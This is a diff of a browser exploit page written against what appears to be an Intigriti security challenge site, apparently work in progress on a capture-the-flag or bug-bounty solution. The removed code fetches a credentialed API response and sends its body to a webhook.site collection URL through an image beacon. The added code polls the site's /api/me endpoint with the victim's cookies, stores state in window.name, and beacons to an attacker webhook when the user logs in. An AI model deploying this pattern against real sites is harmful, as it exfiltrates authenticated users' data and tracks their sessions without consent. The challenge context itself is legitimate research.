@@ -2,30 +2,44 @@
 <html>
 <body>
 <script>
-const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
+const WEBHOOK = "https://webhook.site/XXXX";
 
-(async () => {
+async function checkAuth() {
   try {
-    const res = await fetch(
-      "https://challenge-0126.intigriti.io/api/marketwatch",
+    const r = await fetch(
+      "https://challenge-0126.intigriti.io/api/me",
       { credentials: "include" }
     );
-
-    const text = await res.text();
-
-    new Image().src =
-      WEBHOOK +
-      "?stage=marketwatch_api_response" +
-      "&status=" + res.status +
-      "&body=" + encodeURIComponent(text);
-
-  } catch (e) {
-    new Image().src =
-      WEBHOOK +
-      "?stage=marketwatch_api_error&msg=" +
-      encodeURIComponent(e.toString());
+    return r.ok;
+  } catch {
+    return false;
   }
-})();
+}
+
+async function authWatcher() {
+  const data = JSON.parse(window.name);
+
+  if (data.state === "TRIGGERED") return;
+
+  const loggedIn = await checkAuth();
+
+  if (!loggedIn) {
+    data.state = "WAIT_AUTH";
+    window.name = JSON.stringify(data);
+    return;
+  }
+
+  // 🔔 THIS IS THE MOMENT LOGIN HAPPENED
+  data.state = "AUTH_READY";
+  data.authAt = Date.now();
+  window.name = JSON.stringify(data);
+
+  new Image().src =
+    WEBHOOK + "?stage=auth_detected&ts=" + data.authAt;
+}
+
+setInterval(authWatcher, 5000);
 </script>
+
 </body>
 </html>
